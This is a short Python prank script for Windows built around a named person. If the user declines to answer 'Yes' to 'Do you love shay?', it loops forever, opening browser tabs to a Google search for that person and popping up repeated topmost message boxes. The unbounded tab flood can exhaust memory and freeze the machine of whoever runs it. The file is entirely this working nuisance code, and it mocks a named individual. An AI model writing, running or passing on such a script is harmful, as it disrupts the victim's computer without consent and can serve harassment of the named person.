# Loading Important Stuff
import time
import ctypes
import ctypes.wintypes as w
import webbrowser
BrowserURL = 'https://www.google.com/search?q=shay+carr&sca_esv=564661802&rlz=1C1GCEA_enGB856&ei=fkgAZburDN-xhbIP0ZK2oAc&ved=0ahUKEwi74p6R-aSBAxXfWEEAHVGJDXQQ4dUDCBA&uact=5&oq=shay+carr&gs_lp=Egxnd3Mtd2l6LXNlcnAiCXNoYXkgY2FycjIFEAAYgAQyBRAAGIAEMg0QLhiDARixAxiABBgKMg0QABiABBixAxiDARgKMgcQABiABBgKMgcQABiABBgKMgcQABiABBgKMgcQABiABBgKMgcQABiABBgKMgcQABiABBgKSO4MUI8CWOUHcAF4AZABAJgBiAGgAdoDqgEDMy4yuAEDyAEA-AEBwgIKEAAYRxjWBBiwA8ICChAuGIoFGLADGEPCAgoQABiKBRiwAxhDwgIHEC4YigUYQ8ICDRAuGIoFGLEDGIMBGEPCAgcQABiKBRhDwgIKEC4YsQMYigUYQ8ICCBAuGIAEGLEDwgIOEC4YgAQYsQMYxwEY0QPCAgsQLhiABBjHARivAcICFhAuGIoFGEMYlwUY3AQY3gQY4ATYAQHCAggQABiKBRiRAsICCxAuGK8BGMcBGIAEwgIFEC4YgATCAggQLhiKBRiRAsICCxAuGIAEGMcBGNEDwgIXEC4YigUYkQIYlwUY3AQY3gQY3wTYAQHiAwQYACBBiAYBkAYKugYGCAEQARgU&sclient=gws-wiz-serp&safe=active&ssui=on'
MB_ICONQUESTION = 0x00000020
MB_ICONWARNING = 0x00000030
MB_YESNO = 0x00000004
MB_OK = 0x00000000
MB_HELP = 0x00004000
MB_TOPMOST = 0x00040000
MB_SERVICE_NOTIFICATION = 0x00200000

# Loaded

response = ctypes.windll.user32.MessageBoxW(None, 'Do you love shay?', 'The Big Shay', MB_SERVICE_NOTIFICATION | MB_YESNO)


if response == 6:  # User clicked "Yes"
    ctypes.windll.user32.MessageBoxW(None, 'Shay Approves', 'The Big Shay', MB_ICONWARNING | MB_OK)
else:
    while True:
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        webbrowser.open_new_tab(BrowserURL)
        ctypes.windll.user32.MessageBoxW(None, 'Shay Carr is angry', 'The Big Shay', MB_ICONWARNING | MB_OK | MB_TOPMOST)
        ctypes.windll.user32.MessageBoxW(None, 'I love shay', 'The Big Shay', MB_ICONWARNING | MB_OK)
        ctypes.windll.user32.MessageBoxW(None, 'Will you be my shay', 'The Big Shay', MB_ICONQUESTION | MB_OK)
        ctypes.windll.user32.MessageBoxW(None, 'Shay is the greatest', 'The Big Shay', MB_ICONWARNING | MB_OK | MB_TOPMOST)
        ctypes.windll.user32.MessageBoxW(None, 'Shay Shay Shay Shay Shay Shay Shay Shay Shay ', 'The Big Shay', MB_ICONQUESTION | MB_HELP)
        ctypes.windll.user32.MessageBoxW(None, 'Shay Carr', 'The Big Shay', MB_ICONWARNING | MB_OK | MB_TOPMOST)
        webbrowser.open_new_tab(BrowserURL)

